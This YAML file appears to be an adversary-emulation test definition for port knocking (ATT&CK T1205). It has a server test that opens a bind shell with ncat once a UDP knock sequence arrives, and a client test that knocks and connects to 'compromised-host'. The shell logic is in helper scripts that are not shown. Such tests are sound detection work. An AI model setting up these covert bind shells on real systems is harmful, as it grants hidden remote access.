---
attack_technique: T1205
display_name: Port Knocking

atomic_tests:
- name: Bind Shell After Sequence of Port Knocks - Server
  description: |
    Listen for a sequence of packets on specific ports for a specific protocol.  After the the sequence is received, create bind shell on a new listening port.

    Note: This may be used in conjunction with the client.
  supported_platforms:
    - linux
  input_arguments:
    knock_protocol:
      description: Protocol for knock - tcp or udp
      type: String
      default: "udp"
    knock_port_sequence:
      description: CSV of UDP ports that define a knock
      type: String
      default: "40000,41000,40000,42000,40000,43000"
    server_listening_port:
      description: Port to start listening on after knock
      type: String
      default: "54321"
    max_listen_seconds:
      description: Maximum number of seconds to listen for sequence before stopping and to listen on opened port
      type: String
      default: "300"
  dependencies:
  - description: |
      tshark must be installed  (Terminal Wireshark - https://www.wireshark.org/)
    prereq_command: |
      which tshark
    get_prereq_command: |
      Install tshark (Terminal Wireshark - https://www.wireshark.org/)
  - description: |
      ncat must be installed
    prereq_command: |
      which ncat && ncat --version
    get_prereq_command: |
      Install ncat
  executor:
    name: bash
    elevation_required: false
    command: ./bin/bind_shell_server.sh "#{knock_protocol}" "#{knock_port_sequence}" "#{server_listening_port}" "#{max_listen_seconds}"
    cleanup_command:
      rm -f /tmp/t1205_server.dat

- name: Bind Shell After Sequence of Port Knocks - Client
  description: |
    Send a sequence of packets on specific ports for a specific protocol.  After the the sequence is send, attempt to connect to a bind shell on a new listening port.

    Note: This may be used in conjunction with the server.
  supported_platforms:
    - linux
  input_arguments:
    server_ip:
      description: IP of server to knock
      type: String
      default: "compromised-host"
    knock_protocol:
      description: Protocol for knock - tcp or udp
      type: String
      default: "udp"
    knock_port_sequence:
      description: CSV of UDP ports that define a knock
      type: String
      default: "40000,41000,40000,42000,40000,43000"
    listening_port:
      description: Port the server will listen on after knock
      type: String
      default: "54321"
  dependencies:
  - description: |
      ncat must be installed
    prereq_command: |
      which ncat && ncat --version
    get_prereq_command: |
      Install ncat (netcat)
  executor:
    name: bash
    elevation_required: false
    command: ./bin/bind_shell_client.sh "#{server_ip}" "#{knock_protocol}" "#{knock_port_sequence}" "#{listening_port}"
    cleanup_command:
      rm -f /tmp/t1205_client.dat